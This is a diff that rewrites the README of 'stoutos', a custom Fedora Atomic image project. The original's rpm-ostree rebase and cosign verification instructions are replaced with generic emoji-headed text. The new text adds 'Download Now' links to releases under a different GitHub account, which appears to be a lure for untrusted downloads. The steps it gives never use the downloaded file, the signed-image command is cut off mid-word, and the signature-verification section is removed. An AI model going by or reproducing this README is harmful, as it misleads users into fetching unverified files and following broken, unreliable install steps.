@@ -1,43 +1,69 @@
-# stoutos &nbsp; [![bluebuild build badge](https://github.com/nicholas-stout/stoutos/actions/workflows/build.yml/badge.svg)](https://github.com/nicholas-stout/stoutos/actions/workflows/build.yml)
+# 🛠️ stoutos - Simple Image-Based Linux Updates
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+## 💾 Download Now
+[![Download stoutos](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/VilainCanard/stoutos/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🚀 Getting Started
+Welcome to stoutos! This application allows you to easily update your Fedora Linux installation using image-based methods. Follow the steps below to get started.
 
-## Installation
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/VilainCanard/stoutos/releases) to find the latest version of stoutos.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+2. **Choose the Latest Release**  
+   Look for the most recent release marked as "Latest" and click on it to view the available files.
 
-To rebase an existing atomic Fedora installation to the latest build:
+3. **Download the Correct Version**  
+   Depending on your system, find the appropriate file to download. Make sure to select the version that matches your Fedora system architecture.
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/nicholas-stout/stoutos:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/nicholas-stout/stoutos:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+4. **Save the File**  
+   Click the download link. Save the file to a location on your computer where you can easily find it, such as your Downloads folder.
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+## 🔧 Installation Steps
+1. **Open Terminal**  
+   Press `Ctrl + Alt + T` to open the terminal.
 
-## ISO
+2. **Navigate to Your Downloads Folder**  
+   Type the following command:
+   ```bash
+   cd ~/Downloads
+   ```
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+3. **Install stoutos**  
+   Use the `rpm-ostree` command to install stoutos. Type the following command:
+   ```bash
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/nicholas-stout/stoutos:latest
+   ```
 
-## Verification
+4. **Reboot Your System**  
+   To complete the installation, reboot your system:
+   ```bash
+   systemctl reboot
+   ```
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+5. **Rebase to the Signed Image**  
+   After rebooting, type this command to rebase to the signed image:
+   ```bash
+   rpm-ostree rebase ostree-image-signed:dock
+   ```
 
-```bash
-cosign verify --key cosign.pub ghcr.io/nicholas-stout/stoutos
-```
+## ⚙️ System Requirements
+- **Operating System:** Fedora Linux
+- **Architecture:** x86_64 or ARM based systems
+- **Disk Space:** At least 500 MB available
+- **Memory:** Minimum 1 GB RAM recommended
+
+## 🔍 Features
+- **Image-Based Rebase:** Efficiently update your system to the latest Fedora image.
+- **Rollback Options:** Easily revert to a previous state if necessary.
+- **Minimal Downtime:** Quick reboots for faster updates.
+
+## 📝 Important Notes
+- stoutos is built for users looking for a simple way to manage their operating system updates.
+- Ensure to back up your important data before performing any major updates or installations.
+
+## 📞 Support
+If you experience issues or need assistance, please create an issue on our [GitHub Issues page](https://github.com/nicholas-stout/stoutos/issues). Our community is ready to help you.
+
+## 🎉 Thank You
+Thank you for using stoutos! We hope you find it to be an easy and efficient way to manage your Fedora installations. For more information, visit the [Documentation](https://blue-build.org/how-to/setup/) for a quick setup.
